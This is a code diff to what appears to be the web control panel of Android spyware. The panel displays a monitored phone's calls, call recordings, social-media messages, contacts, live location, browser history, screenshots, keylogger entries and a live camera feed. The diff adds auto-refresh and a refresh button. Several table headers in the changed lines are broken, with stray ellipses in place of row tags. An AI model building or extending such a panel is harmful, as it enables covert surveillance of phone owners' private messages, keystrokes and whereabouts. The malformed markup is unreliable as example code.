@@ -7,6 +7,7 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
+    /* (All existing CSS remains exactly as before) */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Inter', sans-serif;
@@ -77,6 +78,10 @@
       backdrop-filter: blur(5px);
     }
     .top-bar h2 { color: #0f0; text-shadow: 0 0 3px #0f0; }
+    .top-bar .btn-group {
+      display: flex;
+      gap: 10px;
+    }
     .dashboard-card {
       background: rgba(0, 0, 0, 0.75);
       border-radius: 24px;
@@ -208,7 +213,11 @@
   <div class="main-content">
     <div class="top-bar">
       <h2>Welcome, <span id="userName">User</span></h2>
-      <button id="logoutBtn" class="btn-outline"><i class="fas fa-sign-out-alt"></i> Logout</button>
+      <div class="btn-group">
+        <button id="refreshBtn" class="btn-outline"><i class="fas fa-sync-alt"></i> Refresh</button>
+        <button id="autoRefreshToggleBtn" class="btn-outline">⏱️ Auto-Refresh ON</button>
+        <button id="logoutBtn" class="btn-outline"><i class="fas fa-sign-out-alt"></i> Logout</button>
+      </div>
     </div>
 
     <!-- Dashboard Tab -->
@@ -229,29 +238,29 @@
         <div class="card-title">Monitored Devices</div>
         <div class="table-responsive">
           <table id="devicesTable">
-            <thead> <tr><th>Device Name</th><th>Model</th><th>Android Version</th><th>Status</th><th>Last Seen</th></tr> </thead>
+            <thead>  …<th>Device Name</th><th>Model</th><th>Android Version</th><th>Status</th><th>Last Seen</th> </thead>
             <tbody></tbody>
-          </table>
+           </table>
         </div>
       </div>
     </div>
 
     <!-- Calls Tab -->
-    <div id="calls" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Logs</div><div class="table-responsive"><table id="callsTable"><thead> <tr><th>Contact</th><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="calls" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Logs</div><div class="table-responsive"><table id="callsTable"><thead>  …<th>Contact</th><th>Number</th><th>Type</th><th>Duration</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Call Recordings Tab -->
-    <div id="recordings" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Recordings</div><div class="table-responsive"><table id="recordingsTable"><thead> <tr><th>Call ID</th><th>Duration</th><th>Time</th><th>Audio</th></tr> </thead><tbody></tbody></table></div><p class="note" style="margin-top: 20px; color: #0f0;">Note: Call recording feature is under development. Android client will upload recordings when online.</p></div></div>
+    <div id="recordings" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Recordings</div><div class="table-responsive"><table id="recordingsTable"><thead>  …<th>Call ID</th><th>Duration</th><th>Time</th><th>Audio</th> </thead><tbody></tbody></table></div><p class="note" style="margin-top: 20px; color: #0f0;">Note: Call recording feature is under development. Android client will upload recordings when online.</p></div></div>
 
     <!-- All Messages Tab -->
-    <div id="messages" class="tab-content"><div class="dashboard-card"><div class="card-title">All Messages</div><div class="table-responsive"><table id="messagesTable"><thead> <tr><th>App</th><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="messages" class="tab-content"><div class="dashboard-card"><div class="card-title">All Messages</div><div class="table-responsive"><table id="messagesTable"><thead>  …<th>App</th><th>Contact</th><th>Message</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Social Media Tabs (filtered) -->
-    <div id="social-whatsapp" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-whatsapp"></i> WhatsApp Messages</div><div class="table-responsive"><table class="social-table" data-app="whatsapp"><thead> <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
-    <div id="social-instagram" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-instagram"></i> Instagram Messages</div><div class="table-responsive"><table class="social-table" data-app="instagram"><thead> <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
-    <div id="social-facebook" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-facebook"></i> Facebook Messages</div><div class="table-responsive"><table class="social-table" data-app="facebook"><thead> <tr><th>Contact</th><th>Message</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="social-whatsapp" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-whatsapp"></i> WhatsApp Messages</div><div class="table-responsive"><table class="social-table" data-app="whatsapp"><thead>  …<th>Contact</th><th>Message</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="social-instagram" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-instagram"></i> Instagram Messages</div><div class="table-responsive"><table class="social-table" data-app="instagram"><thead>  …<th>Contact</th><th>Message</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="social-facebook" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-facebook"></i> Facebook Messages</div><div class="table-responsive"><table class="social-table" data-app="facebook"><thead>  …<th>Contact</th><th>Message</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Contacts Tab -->
-    <div id="contacts" class="tab-content"><div class="dashboard-card"><div class="card-title">Contacts</div><div class="table-responsive"><table id="contactsTable"><thead> <tr><th>Name</th><th>Number</th><th>Email</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="contacts" class="tab-content"><div class="dashboard-card"><div class="card-title">Contacts</div><div class="table-responsive"><table id="contactsTable"><thead>  …<th>Name</th><th>Number</th><th>Email</th> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Locations Tab -->
     <div id="locations" class="tab-content">
@@ -264,30 +273,30 @@
         <div id="map"></div>
         <div class="table-responsive">
           <table id="locationsTable">
-            <thead> <tr><th>Address</th><th>Lat/Lng</th><th>Time</th></tr> </thead>
+            <thead>  …<th>Address</th><th>Lat/Lng</th><th>Time</th> </thead>
             <tbody></tbody>
-          </table>
+           </table>
         </div>
       </div>
     </div>
 
     <!-- Browser Tab -->
-    <div id="browser" class="tab-content"><div class="dashboard-card"><div class="card-title">Browser History</div><div class="table-responsive"><table id="browserTable"><thead> <tr><th>URL</th><th>Title</th><th>Visit Time</th><th>Frequency</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="browser" class="tab-content"><div class="dashboard-card"><div class="card-title">Browser History</div><div class="table-responsive"><table id="browserTable"><thead>  …<th>URL</th><th>Title</th><th>Visit Time</th><th>Frequency</th> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Screenshots Tab -->
     <div id="screenshots" class="tab-content"><div class="dashboard-card"><div class="card-title">Screenshots</div><div id="screenshotsGrid" style="display: flex; flex-wrap: wrap; gap: 15px;"></div></div></div>
 
     <!-- Keylogger Tab -->
-    <div id="keylogs" class="tab-content"><div class="dashboard-card"><div class="card-title">Keylogger Entries</div><div class="table-responsive"><table id="keylogsTable"><thead> <tr><th>App</th><th>Text</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="keylogs" class="tab-content"><div class="dashboard-card"><div class="card-title">Keylogger Entries</div><div class="table-responsive"><table id="keylogsTable"><thead>  …<th>App</th><th>Text</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Keyword Alerts Tab -->
-    <div id="keywords" class="tab-content"><div class="dashboard-card"><div class="card-title">Keyword Alerts</div><div class="table-responsive"><table id="keywordsTable"><thead> <tr><th>Keyword</th><th>Matched Text</th><th>App</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="keywords" class="tab-content"><div class="dashboard-card"><div class="card-title">Keyword Alerts</div><div class="table-responsive"><table id="keywordsTable"><thead>  …<th>Keyword</th><th>Matched Text</th><th>App</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Geofence Tab -->
-    <div id="geofence" class="tab-content"><div class="dashboard-card"><div class="card-title">Geofence Events</div><div class="table-responsive"><table id="geofenceTable"><thead> <tr><th>Fence Name</th><th>Event</th><th>Center</th><th>Radius</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="geofence" class="tab-content"><div class="dashboard-card"><div class="card-title">Geofence Events</div><div class="table-responsive"><table id="geofenceTable"><thead>  …<th>Fence Name</th><th>Event</th><th>Center</th><th>Radius</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
 
     <!-- App Usage Tab -->
-    <div id="appusage" class="tab-content"><div class="dashboard-card"><div class="card-title">App Usage</div><div class="table-responsive"><table id="appusageTable"><thead> <tr><th>App Name</th><th>Package</th><th>Foreground Time (sec)</th><th>Time</th></tr> </thead><tbody></tbody></table></div></div></div>
+    <div id="appusage" class="tab-content"><div class="dashboard-card"><div class="card-title">App Usage</div><div class="table-responsive"><table id="appusageTable"><thead>  …<th>App Name</th><th>Package</th><th>Foreground Time (sec)</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
 
     <!-- Export Tab -->
     <div id="export" class="tab-content"><div class="dashboard-card"><div class="card-title">Export Data</div><button id="exportBtn" class="btn-primary">Export All as CSV</button></div></div>
@@ -383,6 +392,15 @@
       if (data.success) document.getElementById('userName').innerText = data.user.name;
     }
 
+    // Helper to determine type from item
+    function getItemType(item) {
+      if (item.contactName) return 'Call';
+      if (item.message) return 'Message';
+      if (item.address) return 'Location';
+      if (item.text) return 'Keylog';
+      return 'Unknown';
+    }
+
     // ----- DASHBOARD STATS -----
     async function loadDashboard() {
       const stats = await fetchAPI('/data/stats');
@@ -405,7 +423,7 @@
           else if (item.message) details = `Message (${item.app || 'sms'}): ${item.message.substring(0, 50)}`;
           else if (item.address) details = `Location: ${item.address}`;
           else if (item.text) details = `Keylog: ${item.text.substring(0, 50)}`;
-          const type = item.constructor?.modelName || item.type || 'Unknown';
+          const type = getItemType(item);
           html += `<tr><td>${type}</td><td>${details}</td><td>${new Date(item.timestamp).toLocaleString()}</td></tr>`;
         });
         html += '</tbody></table></div>';
@@ -780,6 +798,78 @@
       }, 30000);
     }
 
+    // ========== AUTO‑REFRESH LOGIC ==========
+    let refreshInterval = null;
+    let autoRefreshActive = true;
+    const AUTO_REFRESH_TIME = 10000; // 10 seconds
+
+    function refreshCurrentTab() {
+      const activeTab = document.querySelector('.tab-content.active');
+      if (!activeTab) return;
+      const tabId = activeTab.id;
+      switch(tabId) {
+        case 'dashboard': loadDashboard(); break;
+        case 'devices': loadDevices(); break;
+        case 'calls': loadCalls(); break;
+        case 'recordings': loadRecordings(); break;
+        case 'messages': loadAllMessages(); break;
+        case 'social-whatsapp': loadMessagesIntoTable('social-whatsapp', 'whatsapp'); break;
+        case 'social-instagram': loadMessagesIntoTable('social-instagram', 'instagram'); break;
+        case 'social-facebook': loadMessagesIntoTable('social-facebook', 'facebook'); break;
+        case 'contacts': loadContacts(); break;
+        case 'locations': loadLocations(); break;
+        case 'browser': loadBrowser(); break;
+        case 'screenshots': loadScreenshots(); break;
+        case 'keylogs': loadKeylogs(); break;
+        case 'keywords': loadKeywords(); break;
+        case 'geofence': loadGeofence(); break;
+        case 'appusage': loadAppUsage(); break;
+        case 'livecamera': loadCameraDevices(); break;
+        // export tab does not need refresh
+      }
+    }
+
+    function startAutoRefresh() {
+      if (refreshInterval) clearInterval(refreshInterval);
+      refreshInterval = setInterval(() => {
+        if (autoRefreshActive) refreshCurrentTab();
+      }, AUTO_REFRESH_TIME);
+    }
+
+    function stopAutoRefresh() {
+      if (refreshInterval) {
+        clearInterval(refreshInterval);
+        refreshInterval = null;
+      }
+    }
+
+    const toggleBtn = document.getElementById('autoRefreshToggleBtn');
+    toggleBtn.addEventListener('click', () => {
+      autoRefreshActive = !autoRefreshActive;
+      if (autoRefreshActive) {
+        toggleBtn.innerHTML = '⏱️ Auto-Refresh ON';
+        toggleBtn.style.background = '';
+        startAutoRefresh();
+      } else {
+        toggleBtn.innerHTML = '⏱️ Auto-Refresh OFF';
+        toggleBtn.style.background = 'rgba(255,0,0,0.2)';
+        stopAutoRefresh();
+      }
+    });
+
+    document.getElementById('refreshBtn').addEventListener('click', () => {
+      playBeep();
+      refreshCurrentTab();
+    });
+
+    // Start auto‑refresh
+    startAutoRefresh();
+
+    // Stop on page unload (optional)
+    window.addEventListener('beforeunload', () => {
+      stopAutoRefresh();
+    });
+
     // ----- TAB SWITCHING -----
     const tabs = document.querySelectorAll('.sidebar a');
     const contents = document.querySelectorAll('.tab-content');
@@ -792,6 +882,7 @@
         tabs.forEach(t => t.classList.remove('active'));
         link.classList.add('active');
         if (tabId !== 'locations' && liveActive) stopLiveTracking();
+        // Load data for the new tab
         switch(tabId) {
           case 'dashboard': loadDashboard(); break;
           case 'devices': loadDevices(); break;
